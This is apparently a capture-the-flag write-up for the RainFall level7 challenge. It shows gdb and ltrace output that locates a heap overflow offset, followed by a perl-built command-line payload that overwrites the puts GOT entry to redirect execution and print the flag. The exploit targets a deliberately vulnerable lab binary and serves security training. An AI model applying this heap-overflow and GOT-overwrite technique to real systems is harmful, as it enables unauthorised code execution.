```
(gdb) info function
All defined functions:
...
0x080484f4  m
0x08048521  main
```

```
 ❯ python3 offset.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz%

level7@RainFall:~$ ltrace ./level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
__libc_start_main(0x8048521, 3, 0xbffff714, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                      = 0x0804a008
malloc(8)                                                                                      = 0x0804a018
malloc(8)                                                                                      = 0x0804a028
malloc(8)                                                                                      = 0x0804a038
strcpy(0x0804a018, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"...)                                      = 0x0804a018
strcpy(0x46464646, "ZZZZ" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

 ❯ python3 offset.py 46
20
```

```
(gdb) info function puts
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

```
level7@RainFall:~$ ./level7 $(perl -e 'print "\x90" x 20 . "\x28\x99\x04\x08" . "\n"') $(perl -e 'print "\xf4\x84\x04\x08" . "\n"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```